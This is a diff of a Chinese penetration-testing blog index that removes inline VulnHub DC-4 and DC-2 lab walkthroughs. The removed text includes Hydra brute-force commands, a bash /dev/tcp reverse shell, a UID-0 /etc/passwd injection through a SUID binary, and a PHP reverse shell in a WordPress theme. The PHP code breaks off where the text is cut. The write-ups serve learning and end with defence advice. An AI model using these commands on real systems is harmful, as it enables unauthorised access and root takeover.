-<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5618">CVE-2017-5618 - GNU Screen 4.5.0 Privilege Escalation</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41154">Exploit-DB: GNU Screen 4.5.0 - Local Privilege Escalation</a></li>
-</ul>
-<hr>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
-<p>本文所涉及的技术、工具和方法仅供<strong>安全研究与学习</strong>之用。严禁利用文中内容进行任何违法活动。读者因不当使用本文信息所造成的任何直接或间接后果，均由使用者本人承担，与本文作者无关。在进行渗透测试前，请确保已获得目标系统所有者的书面授权。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC3-Joomla-SQL-Injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="YunShang">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="渗透测试实战记录">
-      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 渗透测试实战记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/VulnHub-DC3-Joomla-SQL-Injection/" class="post-title-link" itemprop="url">VulnHub DC-3 靶机笔记 — Joomla 注入拿后台</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-08-10 08:00:00" itemprop="dateCreated datePublished" datetime="2024-08-10T08:00:00+08:00">2024-08-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-05 08:00:00" itemprop="dateModified" datetime="2026-04-05T08:00:00+08:00">2026-04-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>VulnHub DC-3 靶机渗透实战。通过 JoomScan 识别 CMS 版本后，利用 Joomla 3.7.0 SQL 注入漏洞（CVE-2017-8917）枚举数据库、获取用户凭据，最终 John 破解密码登录后台。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/VulnHub-DC3-Joomla-SQL-Injection/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -665,7 +220,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -687,7 +242,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>SQL 注入最经典的利用方式——联合查询注入，从 order by 猜列数到 union select 跨库查询，再到 information_schema 自动枚举数据库对象，配合 SQLMap 入门。</p>
+          <p>SQL 注入基础：联合查询注入——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/SQL-injection-union-query/">
@@ -757,7 +312,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -779,175 +334,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅供安全研究与授权测试。未经授权对他人系统进行渗透测试属于违法行为。读者因不当使用文中技术造成一切后果，作者概不负责。请遵守《网络安全法》等相关法律法规。</p>
-<hr>
-<h2 id="攻击链路总览"><a href="#攻击链路总览" class="headerlink" title="攻击链路总览"></a>攻击链路总览</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────┐    ┌────────────────┐    ┌─────────────────┐</span><br><span class="line">│  信息收集     │───▶│  Hydra爆破     │───▶│  命令注入       │</span><br><span class="line">│  nmap/gobuster│    │  Web登录表单    │    │  反弹Shell      │</span><br><span class="line">└───────────────┘    └────────────────┘    └───────┬─────────┘</span><br><span class="line">                                                    │</span><br><span class="line">                                                    ▼</span><br><span class="line">┌───────────────┐    ┌────────────────┐    ┌─────────────────┐</span><br><span class="line">│  获取Flag     │◀───│  teehee SUID   │◀───│  SSH爆破       │</span><br><span class="line">│  Root权限     │    │  提权利用       │    │  jim用户       │</span><br><span class="line">└───────────────┘    └────────────────┘    └─────────────────┘</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h2><table>
-<thead>
-<tr>
-<th>项目</th>
-<th>详情</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>靶机名称</td>
-<td>DC-4</td>
-</tr>
-<tr>
-<td>来源</td>
-<td><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">VulnHub</a></td>
-</tr>
-<tr>
-<td>难度</td>
-<td>初级～中级</td>
-</tr>
-<tr>
-<td>目标</td>
-<td>获取 <code>/root/flag.txt</code></td>
-</tr>
-<tr>
-<td>攻击方式</td>
-<td>暴力破解、命令注入、SUID提权</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>将 DC-4.ova 导入 VirtualBox 或 VMware，网络设为 <strong>NAT&#x2F;桥接</strong> 模式。攻击机使用 Kali Linux，确保二者同网段。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a   <span class="comment"># Kali IP: 192.168.56.101</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h2><h3 id="3-1-主机发现"><a href="#3-1-主机发现" class="headerlink" title="3.1 主机发现"></a>3.1 主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.0/24</span><br></pre></td></tr></table></figure>
-
-<p>发现目标：<strong>192.168.56.104</strong>。</p>
-<h3 id="3-2-端口扫描"><a href="#3-2-端口扫描" class="headerlink" title="3.2 端口扫描"></a>3.2 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p- -T4 192.168.56.104</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>服务</th>
-<th>版本</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>22&#x2F;tcp</td>
-<td>SSH</td>
-<td>OpenSSH 7.4p1 Debian</td>
-</tr>
-<tr>
-<td>80&#x2F;tcp</td>
-<td>HTTP</td>
-<td>nginx 1.15.10</td>
-</tr>
-</tbody></table>
-<h3 id="3-3-目录枚举与页面分析"><a href="#3-3-目录枚举与页面分析" class="headerlink" title="3.3 目录枚举与页面分析"></a>3.3 目录枚举与页面分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.104 -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
-
-<p>未发现隐藏路径，首页即为 <strong>系统登录页面</strong>。查看源码无注释信息。尝试 <code>admin/admin</code> 返回 <code>Wrong credentials</code>。</p>
-<hr>
-<h2 id="四、Hydra-爆破登录表单"><a href="#四、Hydra-爆破登录表单" class="headerlink" title="四、Hydra 爆破登录表单"></a>四、Hydra 爆破登录表单</h2><h3 id="4-1-抓包确定请求格式"><a href="#4-1-抓包确定请求格式" class="headerlink" title="4.1 抓包确定请求格式"></a>4.1 抓包确定请求格式</h3><p>登录请求为 POST，参数为 <code>username</code> 与 <code>password</code>，失败响应包含 <code>Wrong credentials</code>。</p>
-<h3 id="4-2-使用-Hydra-发动攻击"><a href="#4-2-使用-Hydra-发动攻击" class="headerlink" title="4.2 使用 Hydra 发动攻击"></a>4.2 使用 Hydra 发动攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt \</span><br><span class="line">  192.168.56.104 http-post-form \</span><br><span class="line">  <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong credentials&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>爆破成功获取凭据：<code>admin</code> : <code>happy</code></p>
-<h3 id="4-3-登录后的功能面板"><a href="#4-3-登录后的功能面板" class="headerlink" title="4.3 登录后的功能面板"></a>4.3 登录后的功能面板</h3><p>凭据登录后进入 <strong>Command 面板</strong>，提供预设命令按钮（<code>ls -l</code>、<code>df -h</code>、<code>uptime</code>、<code>whoami</code>），另外有一个 <strong>自由输入的命令框</strong>。</p>
-<hr>
-<h2 id="五、命令注入获取-Shell"><a href="#五、命令注入获取-Shell" class="headerlink" title="五、命令注入获取 Shell"></a>五、命令注入获取 Shell</h2><h3 id="5-1-测试命令注入"><a href="#5-1-测试命令注入" class="headerlink" title="5.1 测试命令注入"></a>5.1 测试命令注入</h3><p>在输入框中执行 <code>whoami</code>，返回 <code>www-data</code>，确认命令以 Web 用户身份执行。尝试拼接：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>; <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-
-<p>第二条命令同样被执行，确认存在 <strong>命令注入漏洞</strong>，未做任何过滤。</p>
-<h3 id="5-2-反弹-Shell"><a href="#5-2-反弹-Shell" class="headerlink" title="5.2 反弹 Shell"></a>5.2 反弹 Shell</h3><p>攻击机监听：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-
-<p>在命令框注入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.101/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功获取 <code>www-data</code> 的反弹 Shell。</p>
-<h3 id="5-3-升级交互式-Shell"><a href="#5-3-升级交互式-Shell" class="headerlink" title="5.3 升级交互式 Shell"></a>5.3 升级交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="comment"># 按 Ctrl+Z</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-初步勘察"><a href="#5-4-初步勘察" class="headerlink" title="5.4 初步勘察"></a>5.4 初步勘察</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>        <span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">id</span>            <span class="comment"># uid=33(www-data)</span></span><br><span class="line"><span class="built_in">uname</span> -a      <span class="comment"># Linux dc-4 4.19.0-6-amd64</span></span><br><span class="line"><span class="built_in">ls</span> /home      <span class="comment"># charles  jim  sam</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -E <span class="string">&quot;/bin/bash|/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>系统存在三个可登录用户：<strong>jim</strong>、<strong>charles</strong>、<strong>sam</strong>。</p>
-<hr>
-<h2 id="六、SSH-爆破获取-jim-权限"><a href="#六、SSH-爆破获取-jim-权限" class="headerlink" title="六、SSH 爆破获取 jim 权限"></a>六、SSH 爆破获取 jim 权限</h2><h3 id="6-1-制作词典"><a href="#6-1-制作词典" class="headerlink" title="6.1 制作词典"></a>6.1 制作词典</h3><p>将用户列表保存为文件，以便 Hydra 使用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;jim\ncharles\nsam&quot;</span> &gt; /tmp/users.txt</span><br></pre></td></tr></table></figure>
-
-<p>利用靶机上可能残留的旧密码列表 <code>old-passwords.bak</code>，或直接使用 <code>rockyou.txt</code>。</p>
-<h3 id="6-2-Hydra-对-SSH-爆破"><a href="#6-2-Hydra-对-SSH-爆破" class="headerlink" title="6.2 Hydra 对 SSH 爆破"></a>6.2 Hydra 对 SSH 爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \</span><br><span class="line">  192.168.56.104 ssh -t 4</span><br></pre></td></tr></table></figure>
-
-<p>爆破成功获取凭据：<code>jim</code> : <code>jibril04</code></p>
-<h3 id="6-3-登录-jim"><a href="#6-3-登录-jim" class="headerlink" title="6.3 登录 jim"></a>6.3 登录 jim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.56.104</span><br><span class="line"><span class="comment"># 密码: jibril04</span></span><br></pre></td></tr></table></figure>
-
-<p>顺利以 jim 身份进入系统。</p>
-<hr>
-<h2 id="七、teehee-SUID-提权至-Root"><a href="#七、teehee-SUID-提权至-Root" class="headerlink" title="七、teehee SUID 提权至 Root"></a>七、teehee SUID 提权至 Root</h2><h3 id="7-1-发现特殊-SUID-文件"><a href="#7-1-发现特殊-SUID-文件" class="headerlink" title="7.1 发现特殊 SUID 文件"></a>7.1 发现特殊 SUID 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>输出中除了常用系统命令外，发现一个异常的 SUID 二进制文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/teehee</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-2-分析-teehee"><a href="#7-2-分析-teehee" class="headerlink" title="7.2 分析 teehee"></a>7.2 分析 teehee</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file /usr/bin/teehee</span><br><span class="line"><span class="comment"># ELF 64-bit LSB executable</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin/teehee</span><br><span class="line"><span class="comment"># -rwsr-xr-x 1 root root ... /usr/bin/teehee</span></span><br><span class="line"></span><br><span class="line">strings /usr/bin/teehee</span><br><span class="line"><span class="comment"># 可见 tee 相关函数调用</span></span><br></pre></td></tr></table></figure>
-
-<p><code>teehee</code> 拥有 <strong>SUID root</strong> 权限（<code>rws</code>），功能相当于 <code>tee</code> —— 将标准输入追加写入任意文件。由于以 root 身份执行，它可以写入 <code>/etc/passwd</code>、<code>/etc/shadow</code> 等受保护文件。</p>
-<h3 id="7-3-写入恶意用户到-etc-passwd"><a href="#7-3-写入恶意用户到-etc-passwd" class="headerlink" title="7.3 写入恶意用户到 &#x2F;etc&#x2F;passwd"></a>7.3 写入恶意用户到 &#x2F;etc&#x2F;passwd</h3><p>首先生成密码哈希：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt xyz hacker123</span><br><span class="line"><span class="comment"># 输出: $1$xyz$KdSJXb3y3jMl2Un1J7TV7.</span></span><br></pre></td></tr></table></figure>
-
-<p>利用 <code>teehee -a</code> 追加一条 UID&#x3D;0 的用户：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;pwned:$1$xyz$KdSJXb3y3jMl2Un1J7TV7.:0:0:root:/root:/bin/bash&#x27;</span> | teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><strong>字段含义：</strong></p>
-<p>将 <strong>UID</strong> 和 <strong>GID</strong> 均设为 <strong>0</strong>，等同 root 权限。</p>
-<h3 id="7-4-切换到新用户"><a href="#7-4-切换到新用户" class="headerlink" title="7.4 切换到新用户"></a>7.4 切换到新用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su pwned</span><br><span class="line"><span class="comment"># 输入: hacker123</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure>
-
-<p>提权成功。</p>
-<hr>
-<h2 id="八、获取最终-Flag"><a href="#八、获取最终-Flag" class="headerlink" title="八、获取最终 Flag"></a>八、获取最终 Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#######################################</span><br><span class="line">#  Congratulations! You&#x27;ve rooted     #</span><br><span class="line">#  DC-4 and found the final flag!     #</span><br><span class="line">#  Hope you enjoyed the journey.      #</span><br><span class="line">#######################################</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="九、总结与防御建议"><a href="#九、总结与防御建议" class="headerlink" title="九、总结与防御建议"></a>九、总结与防御建议</h2><h3 id="攻击链回顾"><a href="#攻击链回顾" class="headerlink" title="攻击链回顾"></a>攻击链回顾</h3><table>
-<thead>
-<tr>
-<th>阶段</th>
-<th>技术</th>
-<th>漏洞类型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>初始访问</td>
-<td>Hydra Web登录爆破</td>
-<td>弱口令 <code>admin/happy</code></td>
-</tr>
-<tr>
-<td>立足点</td>
-<td>命令注入反弹Shell</td>
-<td>输入未过滤</td>
-</tr>
-<tr>
-<td>横向移动</td>
-<td>Hydra SSH爆破</td>
-<td>jim 弱口令 <code>jibril04</code></td>
-</tr>
-<tr>
-<td>权限提升</td>
-<td>teehee SUID 写入 &#x2F;etc&#x2F;passwd</td>
-<td>SUID 后门文件</td>
-</tr>
-</tbody></table>
-<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol>
-<li><strong>账号策略</strong>：强制强密码、启用登录失败锁定、引入多因素认证，阻断暴力破解。</li>
-<li><strong>输入过滤</strong>：对所有用户输入采用白名单校验，严格过滤或转义 Shell 元字符。</li>
-<li><strong>最小权限</strong>：Web 服务应以低权限用户运行（如 www-data），而非 root。</li>
-<li><strong>SUID 审计</strong>：定期执行 <code>find / -perm -4000 -type f</code> 审计 SUID 文件，移除未经授权的 SUID 二进制。</li>
-<li><strong>日志监控</strong>：集中收集 SSH、Web 登录日志，实时告警异常登录与命令执行行为。</li>
-</ol>
-<h3 id="参考工具"><a href="#参考工具" class="headerlink" title="参考工具"></a>参考工具</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> — 协议暴力破解</li>
-<li><a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a> — 目录枚举</li>
-<li><a target="_blank" rel="noopener" href="https://nmap.org/">nmap</a> — 网络发现与扫描</li>
-</ul>
-<hr>
-<p><em>本文仅供安全研究与学习交流，请勿用于非法用途。</em></p>
-
+          <p>VulnHub DC-4靶机实战——渗透测试实战笔记，含完整攻击链路与防御方案。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/VulnHub-DC4-writeup/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1101,7 +496,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1123,188 +518,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
-<p><strong>Disclaimer:</strong> 本文仅供安全研究与教育用途。未经授权对他人系统实施攻击属违法行为，作者不承担任何因不当使用本文导致的后果。</p>
-</blockquote>
-<hr>
-<h2 id="攻击路径总览"><a href="#攻击路径总览" class="headerlink" title="攻击路径总览"></a>攻击路径总览</h2><pre class="mermaid">flowchart TD
-    A[内网主机发现] --> B[端口扫描 Nmap]
-    B --> C{80/HTTP, 7744/SSH}
-    C --> D[WordPress 站点侦察]
-    D --> E[wpscan 用户枚举]
-    E --> F[cewl 生成定向密码字典]
-    F --> G[wpscan 密码爆破]
-    G --> H[tom:parturient / jerry:adipiscing]
-    H --> I[WordPress 后台登录]
-    I --> J[主题编辑器 404.php 反弹 Shell]
-    J --> K[Netsh 接收 Shell]
-    K --> L[检测到 rbash 受限]
-    L --> M[vi 逃逸 / PATH 重写绕过]
-    M --> N[su tom 横向移动]
-    N --> O[SUID 枚举: /usr/bin/git]
-    O --> P[git --help → 分页器 !/bin/bash]
-    P --> Q[ROOT 🚩]</pre>
-
-<hr>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现与端口扫描"><a href="#1-1-主机发现与端口扫描" class="headerlink" title="1.1 主机发现与端口扫描"></a>1.1 主机发现与端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan --localnet</span><br><span class="line"><span class="comment"># 定位目标 → 192.168.1.134（请替换为实际 IP）</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.134 -oN dc2_full.txt</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>服务</th>
-<th>版本</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>80&#x2F;tcp</td>
-<td>HTTP</td>
-<td>Apache httpd 2.4.10</td>
-</tr>
-<tr>
-<td>7744&#x2F;tcp</td>
-<td>SSH</td>
-<td>OpenSSH 6.7p1</td>
-</tr>
-</tbody></table>
-<p>访问 <code>http://192.168.1.134</code> 时自动跳转至 <code>http://dc-2</code>，需修复本地 hosts：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.1.134 dc-2&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="二、WordPress-发现与侦察"><a href="#二、WordPress-发现与侦察" class="headerlink" title="二、WordPress 发现与侦察"></a>二、WordPress 发现与侦察</h2><p>打开 <code>http://dc-2</code>，识别为 WordPress 站点。浏览首页即发现 <strong>Flag 1</strong>：</p>
-<blockquote>
-<p>The usual WordPress lists: admin, tom, jerry</p>
-</blockquote>
-<h3 id="2-1-wpscan-用户枚举"><a href="#2-1-wpscan-用户枚举" class="headerlink" title="2.1 wpscan 用户枚举"></a>2.1 wpscan 用户枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
-
-<p>确认三个有效用户：<code>admin</code>、<code>tom</code>、<code>jerry</code>。</p>
-<h3 id="2-2-cewl-定向密码字典"><a href="#2-2-cewl-定向密码字典" class="headerlink" title="2.2 cewl 定向密码字典"></a>2.2 cewl 定向密码字典</h3><p>WordPress 站点页面富含英文词汇，非常适合 <code>cewl</code> 爬取：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w dc2_pass.txt --with-numbers</span><br></pre></td></tr></table></figure>
-
-<p>相比通用弱口令字典，定向字典命中率大幅提升。</p>
-<h3 id="2-3-wpscan-密码爆破"><a href="#2-3-wpscan-密码爆破" class="headerlink" title="2.3 wpscan 密码爆破"></a>2.3 wpscan 密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U admin,tom,jerry -P dc2_pass.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SUCCESS] - tom / parturient</span><br><span class="line">[SUCCESS] - jerry / adipiscing</span><br></pre></td></tr></table></figure>
-
-<p><code>admin</code> 未爆出，但两个低权限用户密码到手。</p>
-<hr>
-<h2 id="三、WordPress-Getshell"><a href="#三、WordPress-Getshell" class="headerlink" title="三、WordPress Getshell"></a>三、WordPress Getshell</h2><h3 id="3-1-后台登录"><a href="#3-1-后台登录" class="headerlink" title="3.1 后台登录"></a>3.1 后台登录</h3><p>访问 <code>http://dc-2/wp-admin</code>，以 <code>tom:parturient</code> 登录。在 Pages 中找到 <strong>Flag 2</strong>：</p>
-<blockquote>
-<p>If you can’t exploit WordPress… there is another way. Hint: tom</p>
-</blockquote>
-<h3 id="3-2-主题编辑器写-Webshell"><a href="#3-2-主题编辑器写-Webshell" class="headerlink" title="3.2 主题编辑器写 Webshell"></a>3.2 主题编辑器写 Webshell</h3><p>导航至 <strong>Appearance → Editor → 404.php</strong>，贴入反弹 Shell：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.xx.xxx&quot;</span>, <span class="number">4444</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="variable">$sock</span>, <span class="number">1</span> =&gt; <span class="variable">$sock</span>, <span class="number">2</span> =&gt; <span 